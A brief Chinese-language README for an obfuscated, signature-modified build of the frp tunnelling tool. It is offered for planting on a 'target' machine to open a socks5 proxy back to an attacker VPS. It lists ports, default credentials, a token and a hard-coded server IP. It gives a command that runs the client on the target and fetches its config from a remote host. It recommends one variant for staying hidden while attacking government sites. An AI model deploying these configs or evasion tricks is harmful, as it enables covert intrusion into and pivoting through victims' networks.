（已做好混淆、加密、特征修改、配置捆绑等操作）
配置：
VPS需开启3333、33333、6000三个端口；
web端(访问端口33333;username:NSdemon password:NSdemon)；
sockt5(访问端口6000;useranme:NSdemon password:NSdemon)；
HTTP(端口8087;无用户密码);
HTTPS(端口8098;无用户密码);

方法一：
目标(nsfrpc_0.45.exe)
web服务(frp.ini)
VPS(nsfrps_0.45_amd64)
命令：nsfrpc_0.45.exe -c http://xxx.com/frp.ini
考虑到怕被盗，token直接放出来
=============================================
[common]
server_addr = 101.35.4.249
token = NSdemon

[plugin_socks]
type = tcp
remote_port = 6000
plugin = socks5
=============================================、

方法二：
目标(nsfrpc_0.45.exe\frp.ini)
VPS(nsfrps_0.45_amd64)
=============================================
frp.ini:
[common]
server_addr = (VPS)
[plugin_socks]
type = tcp
plugin = socks5
remote_port = 6000
=============================================
frps直接运行即可
=============================================
另外做了一个版本是不加密，但修改了frp原有的特征，速度会快点
(日G站想隐藏用nsfrp_0.45_sk)
(日常攻防用nsfrp_0.45_attack即可)
=============================================
作者：CllmsyK_NSdemon